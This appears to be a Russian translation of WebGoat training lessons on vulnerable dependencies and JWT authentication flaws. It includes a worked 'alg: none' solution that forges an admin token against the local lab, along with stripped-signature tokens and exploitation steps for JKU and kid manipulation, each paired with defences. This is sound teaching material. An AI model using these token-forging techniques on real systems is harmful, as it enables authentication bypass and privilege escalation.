Если вы нажмете на кнопку ниже, вы можете попробовать выполнить задания XXE снова и заметите, что уязвимости устранены.

**Применить патч безопасности для XXE**

---

### **(A6) Уязвимые и устаревшие компоненты (Vulnerable and Outdated Components)**  

#### **Уязвимые компоненты**

##### **Концепция

То, как мы создаем программное обеспечение, изменилось. Сообщество открытого исходного кода созревает, и доступность ПО с открытым исходным кодом стала повсеместной, без учета необходимости определения происхождения библиотек, используемых в наших приложениях. (Ссылка: Цепочка поставок ПО)
Этот урок пройдет через трудности управления зависимыми библиотеками, риски отсутствия такого управления и сложности в определении, находитесь ли вы в зоне риска.

**Цели

- Осознать, что потребляемый открытый исходный код так же важен, как и ваш собственный код.
- Осознать уровень управления (или его отсутствия) в нашем потреблении компонентов с открытым исходным кодом.
- Понять важность реестра компонентов (BOM) для определения рисков, связанных с компонентами открытого кода.

---

##### **Экосистемы открытого исходного кода

*   10+ миллионов репозиториев кода на GitHub
*   1 миллион репозиториев кода на Sourceforge
*   2500 публичных репозиториев бинарных файлов
    *   Некоторые репозитории имеют строгие стандарты для публикаторов
    *   Некоторые репозитории требуют распространения исходного кода
    *   Нет гарантии, что опубликованный исходный код соответствует исходному коду опубликованного бинарного файла
    *   Некоторые репозитории позволяют перепубликацию другого набора битов для той же версии
    *   Некоторые репозитории позволяют удалять опубликованные артефакты
*   Много различных систем пакетирования; даже для одного и того же языка
*   Разные системы координат и уровни детализации

---

##### **2013 OWASP Top 10 - A9

Уже в 2013 году такие лидеры мнений, как OWASP, признали, что "МЫ" должны обращать внимание на эту проблему.

---

##### **Компоненты повсюду

WebGoat использует почти 200 Java и JavaScript библиотек. Как и большинство Java-приложений, мы используем Maven для управления нашими Java-зависимостями и применяем стратегию "дикого запада" для управления JavaScript.

Уязвимые компоненты в WebGoat?
Когда этот урок создавался, WebGoat содержал более дюжины рисков высокой степени серьезности в своих компонентах. Большинство из них не было преднамеренным выбором. Как разработчикам предполагалось отслеживать эту информацию across сотен компонентов?

---

##### **Знание "Реестра компонентов" (BOM) открытого кода — это отправная точка

Современные приложения состоят из пользовательского кода и множества компонентов с открытым исходным кодом. Разработчик обычно очень хорошо знает свой собственный код, но менее знаком с потенциальными рисками библиотек/компонентов, которые он использует. Думайте о реестре компонентов как о списке ингредиентов в рецепте.

Вопросы, на которые мы должны знать ответ:

*   Как мы узнаем, какие компоненты с открытым исходным кодом находятся в наших приложениях?
*   Как мы узнаем, какие версии компонентов с открытым исходным кодом мы используем?
*   Как мы определяем риск компонентов с открытым исходным кодом?
*   Как мы обнаруживаем риск компонентов с открытым исходным кодом?
*   Как мы связываем конкретный риск с конкретной версией компонента с открытым исходным кодом?
*   Как мы узнаем, когда компонент выпускает новую версию?
*   Как мы узнаем, если новая уязвимость найдена в том, что ранее было "хорошим" компонентом?
*   Как мы узнаем, используем ли мы аутентичную версию компонента с открытым исходным кодом?

---

##### **Как мне сгенерировать Реестр компонентов (BOM)

Существует несколько решений с открытым исходным кодом и платных, которые идентифицируют риски в компонентах. Однако не так много инструментов, которые предоставят полный список "ингредиентов", используемых в приложении. OWASP Dependency Check предоставляет возможность генерировать реестр компонентов и идентифицировать потенциальные риски безопасности.
Dependency Check использует несколько источников доказательств для определения имен библиотек. Вы можете добавить OWASP Dependency Check как плагин в `pom.xml` проекта Maven, например. Плагин загрузит информацию из публичных баз данных уязвимостей и проверит, используются ли уязвимые библиотеки, и укажет, какая уязвимость была сообщена.
Как часть pipeline разработки, вы можете указать плагину проваливать сборку, если есть нарушения, о которых команда разработки не знала. Дополнительно вы можете использовать xml-файл для исключения некоторых нарушений. Вам следует делать так, если указанная уязвимость не может быть эксплуатрирована в вашем приложении.
В родительском `pom.xml` из WebGoat вы можете увидеть пример:

```xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>5.3.2</version>
    <configuration>
        <failBuildOnCVSS>8</failBuildOnCVSS>
        <autoUpdate>true</autoUpdate>
        <suppressionFile>project-suppression.xml</suppressionFile>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

А также пример подавленных нарушений:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<suppressions xmlns="https://jeremylong.github.io/DependencyCheck/dependency-suppression.1.3.xsd">
    <suppress base="true">
        <gav>org.springframework.security:spring-security-*</gav>
        <cve>CVE-2018-1254</cve>
    </suppress>
    <suppress base="true"><!-- webgoat-server -->
        <gav>org.webjars:jquery-ui</gav>
        <cve>CVE-2018-14936</cve>
    </suppress>
</suppressions>
```

В случае WebGoat плагин активируется, когда запускается (owasp) профиль:

```bash
mvn clean install -Powasp
```

Ниже приведен фрагмент отчета, который можно найти, например, в `webgoat-container/target/dependency-check-report.html`:

---

##### **Перегрузка безопасности информацией

**Что важно?

*   Эксплуатируем ли мой компонент?
*   Является ли мой компонент аутентичной копией?
*   Понимаю ли я, почему мой компонент изменен?

**Информация о безопасности разбросана повсюду
*   Множество источников уведомлений о безопасности
    *   80,000+ CVE в Национальной базе данных уязвимостей
    *   Node Security Project, Metasploit, VulnDB, Snyk, …
    *   Тысячи уведомлений о безопасности на веб-сайтах, блогах, твитах, …
*   600,000 событий GitHub генерируется ежедневно
    *   700 событий GitHub, связанных с безопасностью
    *   Примечания к выпуску, журналы изменений, комментарии в коде, …

**Итог
*   Неразумно ожидать, что разработчик будет постоянно исследовать каждый компонент.
*   Разработчики не являются экспертами по безопасности; у них уже есть основная работа.

---

##### **Перегрузка информацией о лицензиях

**Что важно?

*   Могу ли я использовать этот компонент в контексте распространения моего ПО?
*   Есть ли несовместимости лицензий?
*   Если используется модифицированный компонент, выполнил ли я дополнительные лицензионные обязательства?

**Информация о лицензиях разбросана повсюду
*   Проекты объявляют лицензию:
    *   В файле метаданных проекта.
    *   На веб-сайте проекта или на странице репозитория исходного кода.
    *   Используя ссылку на файл лицензии в их собственном репозитории исходного кода.
    *   В файле лицензии внутри исходного кода проекта.
    *   В бинарной папке META-INF.
*   Проекты включают лицензии в виде заголовков в исходном коде.

**Итог
*   Сложно определить сферу действия лицензии.
*   В проекте часто встречаются несоответствия лицензий.
*   Разработчики не юристы.

---

##### **Архитектурная информация

**Что важно?

*   Мой компонент старый или он стабильный?
*   Мой компонент непопулярный?
*   Было ли мое нежелание обновлять осознанным выбором или недостатком знаний?

**Итог

*   Очень сложно поддерживать компоненты в актуальном состоянии.

Для проанализированных компонентов в 25,000 приложений было обнаружено, что:

*   8% 2-летних компонентов не имели более новой версии
*   23% 11-летних компонентов не имели более новой версии
*   Старые компоненты составляют большинство рисков

---

##### **Некоторые примеры рисков ОСПО

**Commons Collections**
В ноябре 2015 года последний выпуск компонента Apache Commons Collections был 8-летней давности. Commons Collections считался надежным и стабильным компонентом. Исследователь нашел способ эксплуатировать проблему десериализации в Commons Collections, приводящую к удаленному выполнению кода. На следующий день... все, кто использовал Commons Collections, запаниковали.

Ссылка: Thousands of Java applications vulnerable to nine-month-old remote code execution exploit

**Эксплойт Диниша Круза и Альваро Муньоса для XStream**
XStream, относительно распространенная библиотека для разбора XML и JSON, имеет неприятный момент удаленного выполнения кода.
Ссылка: [Блог Диниша Круза] / [Статья о XStream RCE]

Вам может быть полезно прочитать статью(и) перед попыткой выполнения этого урока. Давайте посмотрим, сможете ли вы понять, как эксплуатировать это в WebGoat.

---

##### **Итог

*   Потребление открытого исходного кода в современных приложениях возросло.
*   Открытый исходный код получается из многих различных репозиториев с разными стандартами качества.
*   Информация о безопасности уязвимостей разбросана повсюду.
*   Информацию о лицензиях часто сложно проверить.
*   Большинство команд не имеют стратегии обновления компонентов.
*   **Компоненты с открытым исходным кодом — это новый вектор атак.**

**Что делать

*   Генерируйте реестр компонентов (BOM) для ОСПО.
    *   Используйте автоматизированные инструменты.
*   Создайте базовый уровень потребления открытого исходного кода в вашей организации.
*   Разработайте стратегию управления рисками компонентов с открытым исходным кодом для снижения текущих рисков и уменьшения будущих рисков.

---

### **(A7) Сбои идентификации и аутентификации (Identification and Authentication Failures)**  

#### **Обход аутентификации

##### **Обход аутентификации

Обход аутентификации происходит разными способами, но обычно использует недостатки в конфигурации или логике приложения. Для достижения нужных условий часто применяется изменение данных.

**Скрытые поля ввода

Простейшая форма — это зависимость от скрытого поля ввода на веб-странице/DOM.

**Удаление параметров

Иногда, если злоумышленник не знает правильное значение параметра, он может полностью удалить его из отправляемых данных, чтобы посмотреть, что произойдет.

**Принудительный просмотр (Forced Browsing)

Если область сайта не защищена должным образом с помощью конфигурации, доступ к этой области может быть получен путем угадывания/перебора.

---

#### **Небезопасный вход в систему

##### **Концепция

Шифрование — это важнейший инструмент для обеспечения безопасной связи. На этом уроке мы узнаем, почему его всегда следует использовать при отправке конфиденциальных данных.

**Цели

- Пользователь должен получить базовое представление об использовании снифферов пакетов
- Пользователь сможет перехватывать и читать незашифрованные запросы

---

#### **JWT токены

##### **Концепция

Этот урок рассказывает об использовании JSON Web Tokens (JWT) для аутентификации и о распространенных ошибках, о которых нужно знать при использовании JWT.

**Цели

Научить тому, как безопасно реализовать использование токенов и их валидацию.

**Введение

Многие приложения используют JSON Web Tokens (JWT), чтобы позволить клиенту указывать свою идентичность для дальнейшего обмена данными после аутентификации.

Согласно https://jwt.io/Introduction:

JSON Web Token (JWT) — это открытый стандарт (RFC 7519), который определяет компактный и самодостаточный способ безопасной передачи информации между сторонами в виде объекта JSON. Эту информацию можно проверять и доверять ей, потому что она цифрово подписана. JWT могут быть подписаны с использованием секрета (с алгоритмом HMAC) или пары открытого/закрытого ключа с использованием RSA.

JSON Web Token используется для передачи информации, связанной с идентичностью и характеристиками (утверждениями, claims) клиента. Этот "контейнер" подписывается сервером, чтобы клиент не мог его подделать с целью изменения, например, идентичности или любых характеристик (пример: изменение роли с обычного пользователя на администратора или изменение логина клиента). Этот токен создается во время аутентификации (предоставляется в случае успешной аутентификации) и проверяется сервером перед любой обработкой. Он используется приложением, чтобы позволить клиенту представить токен, представляющий его "удостоверение личности" (контейнер со всей информацией о пользователе), серверу и позволить серверу проверить валидность и целостность токена безопасным способом, все это в рамках stateless и портируемого подхода (портируемого в том смысле, что технологии клиента и сервера могут быть разными, включая также канал передачи, даже если HTTP используется чаще всего).

---

##### **Структура JWT токена

Давайте посмотрим на структуру JWT токена:

Токен кодируется в base64 и состоит из трех частей, разделенных точками:
*   header
*   payload (claims)
*   signature

Пример токена: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`

И заголовок, и утверждения представлены в виде JSON-объектов. Заголовок описывает криптографические операции, примененные к JWT, и, опционально, дополнительные свойства JWT. Утверждения представляют собой JSON-объект, члены которого являются утверждениями, передаваемыми JWT.

---

##### **Неправильное использование утверждений (claims) JWT

Неправильное использование утверждений JWT относится к неправомерному или несанкционированному манипулированию утверждениями внутри JSON Web Token (JWT).

Неправильное использование утверждений JWT может происходить разными способами:

*   **Несанкционированные утверждения**: Злоумышленник может попытаться добавить несанкционированные утверждения в JWT, чтобы получить доступ к определенным функциям или ресурсам, на которые он не имеет права. Например, обычный пользователь пытается изменить свой JWT, чтобы заявить права администратора.
*   **Изменение утверждений**: Злоумышленник может попытаться изменить значения существующих утверждений в JWT, чтобы манипулировать своей идентичностью или изменить свои разрешения. Например, изменение утверждения "user_id" для выдачи себя за другого пользователя.
*   **Избыточные утверждения**: Злоумышленник может попытаться включить множество ненужных или поддельных утверждений в JWT, чтобы увеличить размер токена и, возможно, нарушить производительность системы или вызвать другие проблемы.
*   **Просроченные или измененные утверждения срока действия**: Если злоумышленник может изменить утверждение "exp" (expiration time), чтобы продлить срок действия токена, он может эффективно получить доступ сверх предназначенной сессии.
*   **Атаки повторного использования (Replay attacks)**: Злоумышленник может попытаться повторно использовать валидный JWT из старой сессии, чтобы выдать себя за оригинального пользователя или использовать ограниченную по времени функциональность.
*   **Манипуляция с утверждением ключа (Key ID)**: В некоторых случаях утверждение "kid" (Key ID) может быть использовано неправильно. Злоумышленник может попытаться манипулировать утверждением "kid", чтобы использовать другой ключ для проверки подписи.

Чтобы предотвратить неправильное использование утверждений JWT, необходимо реализовать надлежащие механизмы проверки и верификации как на стороне клиента, так и на стороне сервера. Проверяйте утверждения, чтобы убедиться, что они валидны, авторизованы и соответствуют контексту пользователя. Кроме того, всегда проверяйте подпись JWT, чтобы обеспечить целостность токена и защиту от подделки. Следование лучшим практикам реализации JWT, безопасному управлению ключами и их регулярной ротации также поможет снизить риск неправильного использования утверждений JWT.

В следующих двух разделах мы углубимся в некоторые примеры неправильного использования утверждений заголовка, чтобы дать вам представление о том, как они работают и как защитить приложение.

---

##### **Аутентификация и получение JWT токена

Базовая последовательность получения токена выглядит следующим образом:

**Браузер** <-> **Сервер**

1.  **Браузер:** POST /user/login с именем пользователя и паролем
2.  **Сервер:** Создает JWT с секретом
3.  **Сервер:** Возвращает JWT Браузеру
4.  **Браузер:** Отправляет JWT в заголовке Authorization
5.  **Сервер:** Проверяет подпись JWT. Получает информацию о пользователе из JWT.
6.  **Сервер:** Отправляет ответ клиенту

В этом потоке вы видите, что пользователь входит с именем пользователя и паролем, при успешной аутентификации сервер возвращает токен. Сервер создает новый токен и возвращает его клиенту. Когда клиент делает последующие вызовы к серверу, он прикрепляет новый токен в заголовке "Authorization". Сервер читает токен и сначала проверяет подпись; после успешной проверки сервер использует информацию в токене для идентификации пользователя.

**Утверждения (Claims)

Токен содержит утверждения для идентификации пользователя и всей другой информации, необходимой серверу для выполнения запроса. Помните, что не следует хранить конфиденциальную информацию в токене и всегда передавать его по безопасному каналу.

---

##### **Решение (Атака "alg: none")

Идея этого задания заключается в том, что вы можете манипулировать токеном, что может привести к тому, что сервер интерпретирует токен иначе. В начале, когда появились библиотеки JWT, они реализовывали спецификацию буквально, meaning что библиотека брала алгоритм, указанный внутри заголовка, и пыталась работать с ним.

> "Signed JSON Web Tokens carry an explicit indication of the signing algorithm, in the form of the “alg” Header Parameter, to facilitate cryptographic agility. This, in conjunction with design flaws in some libraries and applications, has led to several attacks:
> *   The algorithm can be changed to “none” by an attacker, and some libraries would trust this value and “validate” the JWT without checking any signature.
> *   An "RS256" (RSA, 2048 bit) parameter value can be changed into "HS256" (HMAC, SHA-256), and some libraries would try to validate the signature using HMAC-SHA256 and using the RSA public key as the HMAC shared secret (см. [MaLear] и [CVE-2016-5431]).
>
> For mitigations, see Sections 3.1 and 3.2."

По сути, происходило то, что библиотеки просто парсили токен в том виде, в каком он был им передан, без проверки того, какая криптографическая операция использовалась при создании токена.

**Решение**
Сначала обратите внимание, что мы вошли как Guest, поэтому выберите другого пользователя, например: Tom. Пользователь Tom может голосовать, как вы можете видеть, но он не может сбросить голоса. Посмотрев на запрос, мы увидим, что он возвращает `access_token` в ответе:

`GET http://localhost:8080/WebGoat/JWT/votings/login?user=Tom HTTP/1.1`

`access_token=eyJhbGciOiJIUzI1NiIs...` (укорочено)

Декодирование токена дает:

```json
// Header
{
    "alg": "HS256"
}
// Payload
{
    "iat": 1688238566,
    "admin": "false",
    "user": "Tom"
}
```

Мы можем изменить утверждение `admin` на `true`, но тогда подпись станет недействительной. Как нам получить валидную подпись? Смотря на спецификацию RFC, `alg: none` является валидным выбором и дает незащищенный JWT (без подписи). Давайте изменим наш токен:

**Заголовок:**
```json
{
    "alg": "none"
}
```
**Утверждения:**
```json
{
    "iat": 1688238566,
    "admin": "true",
    "user": "Tom"
}
```

Если мы используем WebWolf для создания нашего токена, мы получаем:

`eyJhbGciOiJub25lIn0.ewogICJpYXQiOiAxNj...` (укорочено)

Теперь мы можем заменить токен в куки и выполнить сброс голосов снова. Одна вещь, на которую стоит обратить внимание, это добавить точку (.) в конце (представляющую отсутствующую часть подписи), иначе токен будет невалидным.

**Ссылки

Для получения дополнительной информации посмотрите следующее видео: (ссылка не указана)

---

##### **Анализ кода (2) - Пропуск проверки подписи

То же, что и раньше, но теперь мы только удаляем часть подписи, оставляя алгоритм как есть.

Токен: `eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNTE2MjM5ODIyLCJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6IkpvaG4gRG9lIn0.` (подпись отсутствует)

```json
// Header
{
    "alg": "HS256"
}
// Payload
{
    "admin": true,
    "iat": 1516239822,
    "sub": "1234567890",
    "user": "John Doe"
}
```

Используя следующий метод парсинга, мы все еще можем пропустить проверку подписи.

```java
1  try {
2      Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
3      Claims claims = (Claims) jwt.getBody();
4      String user = (String) claims.get("user");
5      boolean isAdmin = Boolean.valueOf((String) claims.get("admin"));
6      if (isAdmin) {
7          removeAllUsers();
8      } else {
9          log.error("You are not an admin user");
10     }
11 } catch (JwtException e) {
12     throw new InvalidTokenException(e);
13 }
```

---

##### **Решение (Проблема с парсингом)

В предыдущих заданиях мы научились **НЕ** доверять библиотекам делать правильные вещи за нас. В обоих случаях мы видели, что даже при указании ключа `.setSigningKey(JWT_PASSWORD)` и передаче правильного алгоритма, библиотека все равно пропускала проверку подписи.
Это не ограничивается только традиционной атакой `alg: none`, но также работает и с `alg: HS256`, если подпись удалена или не проверяется должным образом.

**Вывод

Когда вы выбрали библиотеку для работы с JWT токенами, убедитесь, что:

*   используете правильный метод в вашем коде при проверке токенов (например, методы, которые явно требуют подпись).
*   добавляете тестовые случаи и проверяете, что путаница с алгоритмом невозможна.
*   как команда безопасности, напишите служебный метод для использования командами, который инкапсулирует логику библиотеки, чтобы убедиться, что команды используют правильную логику парсинга.

**Альтернатива: PASETO

Проблема путаницы алгоритмов является реальной проблемой при работе с JWT. Этого можно избежать, используя PASETO (**Platform-Agnostic Security Tokens**), который в настоящее время реализован на 10 языках программирования. Один из недостатков использования этого метода заключается в том, что JWT широко распространен, например, подумайте об использовании OAuth, поэтому это может быть не лучшим решением для использования.
Для получения дополнительной информации посмотрите следующее видео: (ссылка не указана)

---

##### **Обновление токена

**Введение**
В этом разделе мы затрагиваем тему обновления access token.

**Типы токенов**
В целом существует два типа токенов: access token и refresh token. Access token используется для выполнения API-вызовов к серверу. Access tokens имеют ограниченный срок жизни, вот где появляется refresh token. Как только access token становится недействительным, можно сделать запрос к серверу, чтобы получить новый access token, представив refresh token. Refresh token также может иметь срок действия, но их срок жизни намного longer. Это решает проблему необходимости пользователю снова аутентифицироваться со своими учетными данными. Следует ли вам использовать refresh token или только access token, зависит от контекста.

Итак, нормальный поток может выглядеть так:

`curl -X POST -H ... -d "username=webgoat&password=webgoat" localhost:8080/webgoat/login`

Сервер возвращает:

```json
{
    "token_type": "bearer",
    "access_token": "xxxx.YYYY.ZZZZ",
    "expires_in": 1800,
    "refresh_token": "ae5a9b16c3c13a32d315c56599f4e80f"
}
```

Как вы можете видеть, refresh token — это случайная строка, которую сервер может отслеживать в памяти или хранить в базе данных, чтобы сопоставить refresh token с пользователем, которому он был выдан. Таким образом, в этом случае, пока access token все еще действителен, мы можем говорить о "stateless" сессии, нет нагрузки на сервер по поддержанию сессии пользователя, токен самодостаточен. Когда access token становится недействительным, серверу необходимо запросить сохраненный refresh token, чтобы убедиться, что токен не заблокирован каким-либо образом.

Если злоумышленник завладеет access token, он действителен только в течение определенного времени (скажем, 10 минут). Затем злоумышленнику понадобится refresh token, чтобы получить новый access token. Вот почему refresh token требует лучшей защиты. Также возможно сделать refresh token stateless, но тогда становится сложнее отслеживать, отозвал ли пользователь токены. После того как сервер выполнит все проверки, он должен вернуть новый refresh token и новый access token клиенту. Клиент может использовать новый access token для выполнения API-вызова.

**Что следует проверять?**
Запросы к конечной точке обновления должны хранить достаточно информации на стороне сервера, чтобы проверить, все ли еще доверяют пользователю. Вы можете думать о многих вещах, например, хранить IP-адрес, отслеживать, сколько раз refresh token был использован (использование refresh token несколько раз в допустимом временном окне), или access token может указывать на странное поведение, вы можете отозвать все токены и заставить пользователя снова аутентифицироваться). Также отслеживайте, какой access token принадлежал какому refresh token, иначе злоумышленник может получить новый access token для другого пользователя с помощью refresh token злоумышленника (см. https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/ для хорошего описания того, как эта атака работает). Также хорошей практикой является проверка IP-адреса или геолокации пользователя. Если вам нужно выдать новый токен, проверьте, не изменилось ли местоположение; если да, отзовите все токены и заставьте пользователя снова аутентифицироваться.

**Необходимость в refresh tokens**
Имеет ли смысл использовать refresh token в современном одностраничном приложении (SPA)? Как мы видели в разделе о хранении токенов, есть два варианта: веб-хранилище или куки, что означает, что refresh token находится прямо рядом с access token, поэтому, если access token скомпрометирован, скорее всего, refresh token также будет скомпрометирован. Конечно, большую часть времени есть разница. Access token отправляется при выполнении API-вызова, refresh token отправляется только тогда, когда нужно получить новый access token, что в большинстве случаев является другой конечной точкой. Если вы находитесь на одном и том же сервере, вы можете выбрать использование только access token.

Как упоминалось выше, использование access token и отдельного refresh token дает серверу некоторое преимущество, чтобы не проверять access token снова и снова. Выполняйте проверку только тогда, когда пользователю нужен новый access token. Безусловно, возможно использовать только access token. На сервере вы храните ту же самую информацию, которую вы бы хранили для refresh token (см. предыдущий абзац). Таким образом, вам нужно проверять токен каждый раз, но это может быть приемлемо в зависимости от приложения. В случае, когда refresh tokens хранятся для проверки, важно защитить эти токены также (по крайней мере, используйте хеш-функцию для их хранения в вашей базе данных).

**JWT — хорошая идея?**
Существует много ресурсов, в которых ставится под сомнение целесообразность использования JWT токенов для аутентификации между клиентом и сервером по сравнению с куками. Лучшее место для использования JWT токена — это общение между сервером и сервером. В обычном веб-приложении вам лучше использовать обычные сессии и куки. См. дополнительную информацию:
*   stop-using-jwt-for-sessions
*   stop-using-jwt-for-sessions-part-2-why-your-solution-does-not-work
*   flowchart

---

##### **Неправильное использование утверждений JWT (Повторение/Уточнение)

Неправильное использование утверждений JWT относится к неправомерному или несанкционированному манипулированию утверждениями внутри JSON Web Token (JWT). JWT — это компактный и самодостаточный способ представления информации между двумя сторонами. Он состоит из заголовка, полезной нагрузки (утверждений) и подписи.

Неправильное использование утверждений JWT может происходить разными способами:

- **Несанкционированные утверждения**: Злоумышленник может попытаться добавить несанкционированные утверждения в JWT, чтобы получить доступ к определенным функциям или ресурсам, на которые он не имеет права. Например, обычный пользователь пытается изменить свой JWT, чтобы заявить права администратора.
- **Изменение утверждений**: Злоумышленник может попытаться изменить значения существующих утверждений в JWT, чтобы манипулировать своей идентичностью или изменить свои разрешения. Например, изменение утверждения "user_id" для выдачи себя за другого пользователя.
- **Избыточные утверждения**: Злоумышленник может попытаться включить множество вредоносных или ложных утверждений в JWT, чтобы увеличить размер токена и, возможно, нарушить производительность системы или вызвать другие проблемы.
- **Просроченные или измененные утверждения срока действия**: Если злоумышленник может изменить утверждение "exp" (expiration time), чтобы продлить срок действия токена, он может эффективно получить доступ сверх предназначенной сессии.
- **Атаки повторного использования (Replay attacks)**: Злоумышленник может попытаться повторно использовать валидный JWT из старой сессии, чтобы выдать себя за оригинального пользователя или использовать ограниченную по времени функциональность.
- **Манипуляция с утверждением ключа (Key ID)**: В некоторых случаях утверждение "kid" (Key ID) может быть использовано неправильно. Злоумышленник может попытаться манипулировать утверждением "kid", чтобы использовать другой ключ для проверки подписи.

Чтобы предотвратить неправильное использование утверждений JWT, необходимо реализовать надлежащие механизмы проверки и верификации как на стороне клиента, так и на стороне сервера. Проверяйте утверждения, чтобы убедиться, что они валидны, авторизованы и соответствуют контексту пользователя. Кроме того, всегда проверяйте подпись JWT, чтобы обеспечить целостность токена и защиту от подделки. Следование лучшим практикам реализации JWT, безопасному управлению ключами и их регулярной ротации также поможет снизить риск неправильного использования утверждений JWT.

В следующих двух разделах мы углубимся в некоторые примеры неправильного использования утверждений заголовка, чтобы дать вам представление о том, как они работают и как защитить приложение.

---

##### **Неправильное использование утверждений (Атака через JKU)

Неправильное использование утверждений заголовка может произойти, когда информация заголовка подделана или манипулируется ненадлежащим образом.

**JSON Web Key Set URL (JKU)

JKU — это часть спецификации JWT, которая позволяет потребителю JWT динамически получать открытый ключ, необходимый для проверки подписи токена. Это URL-адрес, который указывает на конечную точку JSON Web Key Set (JWKS), содержащую открытые ключи, используемые издателем для подписи JWT. Пример JKU будет выглядеть так:

`"jku": "https://example.com/well-known/jwks.json"`

**Уязвимость

Уязвимость неправильного использования утверждения JWT с JKU возникает, когда JWT подписан слабым или предсказуемым ключом, и сервер предоставляет JKU, который указывает на внешнее местоположение, размещающее открытый ключ.

Злоумышленники могут использовать эту уязвимость, создавая JWT со злонамеренными утверждениями и используя JKU, чтобы обмануть сервер, заставив его проверить JWT, используя слабый или сфальсифицированный ключ. Все зависит от библиотеки, используемой внутри приложения. Некоторые библиотеки по умолчанию блокируют загрузку с пользовательского сервера и используют список разрешенных URL-адресов. Однако фильтрация URL-адресов довольно сложна в реализации, и ее также можно обойти.

**Шаги эксплуатации

*   **Идентифицировать конечную точку JKU:** Злоумышленник сначала должен найти конечную точку JKU в логике обработки JWT приложения или в любых открытых конфигурациях.
*   **Сгенерировать злонамеренный JWT:** Создать JWT со злонамеренными утверждениями, изменяя или добавляя утверждения для получения несанкционированного доступа или повышения привилегий.
*   **Подписать JWT:** Используя свой собственный закрытый ключ, подписать злонамеренный JWT.
*   **Отправить JWT на сервер:** Отправить созданный JWT со злонамеренными утверждениями на сервер.
*   **Проверка сервером:** Сервер при получении JWT проверяет подпись, используя открытый ключ, полученный из конечной точки JWKS.
*   **Успешная атака:** Если сервер использует слабый или сфальсифицированный ключ для проверки JWT, злоумышленник получает несанкционированный доступ или выполняет запланированную эксплуатацию.

**Защита

Чтобы предотвратить неправильное использование JWT с JKU, разработчики и специалисты по безопасности должны следовать этим лучшим практикам:

*   **Белый список:** Используйте белый список, чтобы проверить, находится ли полученный JKU из токена в списке разрешенных. Будьте осторожны при сравнении URL, используя функции сравнения строк; используйте белый список и проверяйте весь URL из JKU.
*   **Статические ключи:** Избегайте использования JKU для открытых ключей, размещенных на внешних конечных точках. Вместо этого используйте статические ключи, которые безопасно управляются и регулярно обновляются.
*   **Проверка подписи:** Убедитесь, что сервер правильно проверяет подпись JWT и отклоняет токены с недействительными или поддельными подписями.
*   **Валидация JWT:** Тщательно проверяйте и санируйте все утверждения JWT, чтобы предотвратить атаки внедрения и несанкционированный доступ.
*   **Аудит и мониторинг:** Регулярно проводите аудит использования JWT, отслеживайте подозрительную активность и внедряйте механизмы обнаружения аномалий.
*   **Тестирование безопасности:** Регулярно выполняйте тестирование безопасности, включая пентестинг и анализ кода, чтобы выявлять и устранять потенциальные уязвимости.

---

##### **Неправильное использование утверждений (Атака через Key ID - kid)

Далее мы исследуем последствия для безопасности неправильного использования утверждения Key ID (kid) в JSON Web Tokens (JWT).

**JSON Key ID (kid)

Key ID (kid) указывает, какой ключ из набора JSON Web Key Set (JWKS) следует использовать для проверки подписи JWT. При неправильном использовании злоумышленники могут использовать эту уязвимость для получения несанкционированного доступа к конфиденциальным ресурсам или повышения привилегий.

Пример kid будет выглядеть так:

`"kid": "rsa_2023_key"`

или

`"kid": "1"`

**Уязвимость

Когда утверждение kid используется неправильно, это обычно означает, что значение "kid" манипулируется, чтобы указывать на ключ, отличный от того, который использовался для подписи токена. Эта манипуляция может привести к различным проблемам безопасности:

*   **Атака путаницы ключей (Key confusion attack):** В этой атаке злоумышленник манипулирует значением утверждения "kid", чтобы оно указывало на ключ, отличный от использованного для подписи токена. В результате получатель JWT будет проверять подпись, используя неправильный ключ, что позволит злоумышленнику выдавать себя за других пользователей или выполнять несанкционированные действия.
*   **Перебор ключей (Key enumeration):** Если утверждение kid не защищено должным образом или представляет собой просто увеличивающееся число или легко предсказуемое значение, злоумышленник может попытаться угадать или перебрать действительные значения "kid". Делая это, он может потенциально подделывать JWT с разными значениями kid, чтобы найти уязвимости или слабости в системе.
*   **Подмена ключа (Key spoofing):** В этой атаке злоумышленник создает JWT с поддельным утверждением kid, указывающим на несуществующий или недействительный ключ. Цель состоит в том, чтобы обойти проверку подписи и потенциально получить несанкционированный доступ к ресурсам или функциям.
*   **Перезапись ключа (Key overwrite):** Злоумышленник может попытаться перезаписать или изменить утверждение kid во время передачи или обработки токена, чтобы оно указывало на ключ, отличный от первоначально предназначенного. Эта манипуляция может привести к сбоям проверки подписи или другим проблемам безопасности.
*   **Токены без kid (Kidless tokens):** Если система не требует наличия утверждения kid, злоумышленник может попытаться создать JWT без включения утверждения "kid" вообще. Это упущение может привести к уязвимостям, если получатель предполагает ключ по умолчанию или известный ключ, который может быть небезопасным.
*   **Небезопасное хранение ключей:** Если утверждение "kid" сочетается с другими слабыми практиками безопасности, такими как хранение ключей в открытом виде или использование слабого шифрования, злоумышленник может получить действительные значения "kid" и использовать связанные с ними ключи.

**Шаги эксплуатации:
*   Идентифицировать конечную точку kid / механизм сопоставления ключей.
*   Сгенерировать злонамеренный JWT.
*   Указать kid, который заставит сервер использовать ключ, известный злоумышленнику.
*   Отправить JWT на сервер.
*   Сервер проверяет подпись, используя ключ, на который указывает "kid".
*   Успешная атака, если сервер использует скомпрометированный или слабый ключ.

**Защита

Чтобы предотвратить неправильное использование JWT с утверждением kid, разработчики и специалисты по безопасности должны следовать этим лучшим практикам:

*   **Валидация:** Всегда проверяйте утверждение kid и убедитесь, что оно указывает на доверенный ключ, подходящий для проверки подписи.
*   **Ротация ключей:** Регулярно меняйте ключи, используемые для подписи JWT, и соответствующим образом обновляйте связанные утверждения "kid".
*   **Используйте сильные ключи:** Убедитесь, что для подписи токена используются стойкие криптографические ключи.
